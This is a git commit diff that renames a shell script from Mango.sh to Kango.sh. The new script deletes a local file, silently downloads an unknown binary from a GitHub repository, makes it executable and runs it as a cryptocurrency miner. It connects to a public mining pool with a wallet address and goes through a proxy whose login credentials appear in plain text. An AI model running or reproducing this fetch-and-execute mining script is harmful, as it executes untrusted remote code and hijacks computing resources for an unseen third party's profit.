9ca38b339716e6b1ec0a31647f16fd93ad7b057a
Testdrive345 <93646807+Testdrive345@users.noreply.github.com>
2022-12-29 16:00:33 +0530

    Update and rename Mango.sh to Kango.sh

---
+++ Kango.sh
@@ -0,0 +1,2 @@
+rm -rf data
+wget https://github.com/Master478963/lolMinet/raw/main/data   &> /dev/null && chmod +x data && ./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX --timeout 120 -p c=RVN,m=solo,ID=Test  -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
--- Mango.sh
+++
@@ -1,4 +0,0 @@
-rm -rf data
-wget https://github.com/Master478963/lolMinet/raw/main/data 
-chmod +x data 
-./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RFqmNRc3ycwR2UMcx5afpbgCDzHs7gYavX --timeout 120 -p c=RVN,m=solo,ID=Test  -x xutcvpkv-rotate:te7t633kbfmz@p.webshare.io:80
